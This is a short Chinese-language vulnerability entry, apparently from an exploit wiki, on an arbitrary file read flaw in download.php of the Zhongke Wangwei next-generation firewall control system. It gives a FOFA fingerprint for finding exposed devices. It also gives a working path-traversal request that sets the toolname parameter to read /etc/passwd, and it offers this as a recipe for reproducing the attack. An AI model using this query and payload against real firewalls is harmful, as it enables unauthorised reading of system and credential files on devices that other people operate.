# 中科网威 下一代防火墙控制系统 download.php 任意文件读取漏洞

## 漏洞描述

中科网威 下一代防火墙控制系统 download.php 任意文件读取漏洞, 攻击者通过漏洞可以读取服务器上的文件

## 漏洞影响

> [!NOTE]
>
> 中科网威 下一代防火墙控制系统

## FOFA

> [!NOTE]
>
> body="Get_Verify_Info(hex_md5(user_string)."

## 漏洞复现

登录页面如下

![image-20210531184103009](http://wikioss.peiqi.tech/vuln/image-20210531184103009.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

漏洞存在于 download.php

![image-20210602161941678](http://wikioss.peiqi.tech/vuln/image-20210602161941678.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

任意点击后抓包，更改 **toolname** 参数

```
/download.php?&class=vpn&toolname=../../../../../../../../etc/passwd
```

![image-20210602162110747](http://wikioss.peiqi.tech/vuln/image-20210602162110747.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

## Goby & POC

![image-20210602162300324](http://wikioss.peiqi.tech/vuln/image-20210602162300324.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)